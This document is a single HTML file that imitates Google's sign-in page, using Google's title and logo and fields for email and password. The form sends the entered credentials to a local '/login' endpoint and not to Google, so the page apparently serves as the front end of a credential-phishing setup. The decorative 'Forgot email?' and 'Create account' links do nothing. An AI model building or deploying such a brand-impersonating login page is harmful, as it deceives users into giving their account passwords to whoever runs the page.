<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Sign-In</title>
    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            background-color: #f1f3f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #FFFFFF;
            border-radius: 8px;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
            padding: 40px;
            text-align: center;
            width: 360px;
        }

        .logo {
            width: 75px;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 24px;
            color: #202124;
            margin-bottom: 30px;
        }

        .input-field {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            border-radius: 4px;
            border: 1px solid #dadce0;
            font-size: 16px;
            box-sizing: border-box;
        }

        .forgot-email {
            display: block;
            text-align: left;
            color: #1a73e8;
            font-size: 14px;
            margin-bottom: 30px;
            cursor: pointer;
        }

        .sign-in-btn {
            background-color: #1a73e8;
            border: none;
            color: #FFFFFF;
            padding: 10px 0;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            margin-top: 20px;
        }

        .sign-in-btn:hover {
            background-color: #1558b0;
        }

        .create-account {
            margin-top: 30px;
            color: #1a73e8;
            font-size: 14px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="logo">
        <h1>Sign in</h1>

        <form action="/login" method="POST">
            <input type="text" class="input-field" name="username" placeholder="Email or phone" required>
            <div class="forgot-email">Forgot email?</div>
            <input type="password" class="input-field" name="password" placeholder="Enter your password" required>
            <button type="submit" class="sign-in-btn">Sign in</button>
        </form>

        <div class="create-account">Create account</div>
    </div>
</body>
</html>
